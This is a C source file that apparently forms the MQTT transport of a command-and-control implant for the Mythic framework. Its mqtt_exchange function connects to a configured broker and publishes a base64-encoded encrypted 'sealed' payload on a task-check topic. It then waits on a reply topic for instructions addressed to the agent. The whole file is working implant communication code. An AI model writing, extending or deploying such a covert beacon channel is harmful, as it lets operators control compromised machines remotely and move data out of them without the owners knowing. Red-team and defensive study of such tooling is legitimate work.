#include "common.h"
#include "crypto.h"
#include "mqtt.h"
#include "sock.h"

typedef struct {
    unsigned char *p;
    size_t len, cap;
} mbuf_t;

static int mput(mbuf_t *m, const void *b, size_t n) {
    if (m->len + n > m->cap) {
        size_t want = m->len + n + 64;
        unsigned char *grown = (unsigned char *)realloc(m->p, want);
        if (!grown)
            return -1;
        m->p = grown;
        m->cap = want;
    }
    memcpy(m->p + m->len, b, n);
    m->len += n;
    return 0;
}

static int mstr(mbuf_t *m, const char *s) {
    size_t n = strlen(s);
    unsigned char hdr[2];
    if (n > 65535)
        return -1;
    hdr[0] = (unsigned char)(n >> 8);
    hdr[1] = (unsigned char)n;
    return mput(m, hdr, 2) || mput(m, s, n) ? -1 : 0;
}

static int mqtt_write_pkt(SOCKET s, unsigned char fixed, const unsigned char *body, size_t len) {
    unsigned char hdr[6];
    size_t hlen = 1, n = len;
    hdr[0] = fixed;
    do {
        unsigned char b = (unsigned char)(n % 128);
        n /= 128;
        if (n > 0)
            b |= 0x80;
        if (hlen >= sizeof(hdr))
            return -1;
        hdr[hlen++] = b;
    } while (n > 0);
    if (sock_send_all(s, hdr, hlen) != 0)
        return -1;
    return sock_send_all(s, body, len);
}

static int mqtt_read_pkt(SOCKET s, unsigned char *fixed, bytebuf_t *body) {
    unsigned char fb;
    size_t n = 0, mult = 1;
    int i;
    body->data = NULL;
    body->len = 0;
    if (sock_recv_all(s, &fb, 1) != 0)
        return -1;
    for (i = 0; i < 4; i++) {
        unsigned char b;
        if (sock_recv_all(s, &b, 1) != 0)
            return -1;
        n += (size_t)(b & 0x7F) * mult;
        if ((b & 0x80) == 0)
            break;
        mult *= 128;
    }
    if (n > 16 * 1024 * 1024)
        return -1;
    body->data = (unsigned char *)malloc(n + 1);
    if (!body->data && n > 0)
        return -1;
    if (n > 0 && sock_recv_all(s, body->data, n) != 0) {
        bytebuf_free(body);
        return -1;
    }
    body->data[n] = '\0';
    body->len = n;
    *fixed = fb;
    return 0;
}

static int strieq(const char *a, const char *b) {
    while (*a && *b) {
        char ca = *a++, cb = *b++;
        if (ca >= 'A' && ca <= 'Z')
            ca += 'a' - 'A';
        if (cb >= 'A' && cb <= 'Z')
            cb += 'a' - 'A';
        if (ca != cb)
            return 0;
    }
    return *a == *b;
}

int mqtt_exchange(const agent_config_t *cfg, const unsigned char *sealed, size_t sealed_len,
                  unsigned char **out, size_t *out_len) {
    SOCKET s = INVALID_SOCKET;
    char pub[160], sub[160], client[80], port[16];
    char *body = NULL;
    bytebuf_t pkt = {0};
    unsigned char fixed;
    int rc = -1, timeout = 60000;
    *out = NULL;
    *out_len = 0;
    if (strieq(cfg->mqtt_use_ssl, "true"))
        return -1; /* native has no TLS stack; go compiler covers it */
    snprintf(pub, sizeof(pub), "%s%s", cfg->mqtt_topic, cfg->mqtt_taskcheck);
    snprintf(sub, sizeof(sub), "%s%s", cfg->mqtt_topic, cfg->mqtt_mythic);
    snprintf(client, sizeof(client), "%s-%04x%04x",
             cfg->mqtt_client[0] ? cfg->mqtt_client : "erlikhan",
             rand() & 0xFFFF, rand() & 0xFFFF);
    snprintf(port, sizeof(port), "%s", cfg->mqtt_port[0] ? cfg->mqtt_port : "8883");
    if (sock_tcp(cfg->mqtt_server, port, &s) != 0)
        return -1;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));
    /* CONNECT */
    {
        mbuf_t m = {0};
        unsigned char head[] = {0x00, 0x04, 'M', 'Q', 'T', 'T', 0x04, 0x02, 0x00, 0x3C};
        if (cfg->mqtt_user[0])
            head[7] |= 0x80;
        if (cfg->mqtt_pass[0])
            head[7] |= 0x40;
        if (mput(&m, head, sizeof(head)) != 0 || mstr(&m, client) != 0 ||
            (cfg->mqtt_user[0] && mstr(&m, cfg->mqtt_user) != 0) ||
            (cfg->mqtt_pass[0] && mstr(&m, cfg->mqtt_pass) != 0)) {
            free(m.p);
            goto done;
        }
        rc = mqtt_write_pkt(s, 0x10, m.p, m.len);
        free(m.p);
        if (rc != 0)
            goto done;
    }
    if (mqtt_read_pkt(s, &fixed, &pkt) != 0)
        goto done;
    if (fixed != 0x20 || pkt.len != 2 || pkt.data[1] != 0x00)
        goto done;
    bytebuf_free(&pkt);
    /* SUBSCRIBE id 1, qos 1 */
    {
        mbuf_t m = {0};
        unsigned char id[] = {0x00, 0x01};
        if (mput(&m, id, 2) != 0 || mstr(&m, sub) != 0 || mput(&m, "\x01", 1) != 0) {
            free(m.p);
            goto done;
        }
        rc = mqtt_write_pkt(s, 0x82, m.p, m.len);
        free(m.p);
        if (rc != 0)
            goto done;
    }
    if (mqtt_read_pkt(s, &fixed, &pkt) != 0)
        goto done;
    if (fixed != 0x90 || pkt.len != 3 || pkt.data[2] == 0x80)
        goto done;
    bytebuf_free(&pkt);
    /* PUBLISH id 2, qos 1 */
    body = b64_encode(sealed, sealed_len, NULL);
    if (!body)
        goto done;
    {
        mbuf_t m = {0};
        if (mstr(&m, pub) != 0 || mput(&m, "\x00\x02", 2) != 0 ||
            mput(&m, body, strlen(body)) != 0) {
            free(m.p);
            goto done;
        }
        rc = mqtt_write_pkt(s, 0x32, m.p, m.len);
        free(m.p);
        if (rc != 0)
            goto done;
    }
    free(body);
    body = NULL;
    if (mqtt_read_pkt(s, &fixed, &pkt) != 0)
        goto done;
    if (fixed != 0x40 || pkt.len != 2 || pkt.data[0] != 0x00 || pkt.data[1] != 0x02)
        goto done;
    bytebuf_free(&pkt);
    /* Wait for PUBLISH on the reply topic. */
    for (;;) {
        unsigned int qos, tlen;
        unsigned char *rest;
        size_t rest_len;
        if (mqtt_read_pkt(s, &fixed, &pkt) != 0)
            goto done;
        if ((fixed & 0xF0) != 0x30) {
            bytebuf_free(&pkt);
            continue;
        }
        qos = (fixed & 0x06) >> 1;
        if (pkt.len < 2) {
            bytebuf_free(&pkt);
            goto done;
        }
        tlen = ((unsigned int)pkt.data[0] << 8) | pkt.data[1];
        if (pkt.len < 2 + tlen) {
            bytebuf_free(&pkt);
            goto done;
        }
        rest = pkt.data + 2 + tlen;
        rest_len = pkt.len - 2 - tlen;
        if (qos == 1) {
            if (rest_len < 2) {
                bytebuf_free(&pkt);
                goto done;
            }
            mqtt_write_pkt(s, 0x40, rest, 2); /* PUBACK, best effort */
            rest += 2;
            rest_len -= 2;
        }
        if (tlen != strlen(sub) || memcmp(pkt.data + 2, sub, tlen) != 0) {
            bytebuf_free(&pkt);
            continue;
        }
        *out = b64_decode((const char *)rest, out_len);
        bytebuf_free(&pkt);
        if (!*out)
            goto done;
        /* b64_decode needs NUL termination; rest came from a NUL-padded read. */
        rc = 0;
        break;
    }
done:
    if (rc == 0)
        mqtt_write_pkt(s, 0xE0, NULL, 0); /* DISCONNECT, best effort */
    free(body);
    bytebuf_free(&pkt);
    sock_close(s);
    return rc;
}
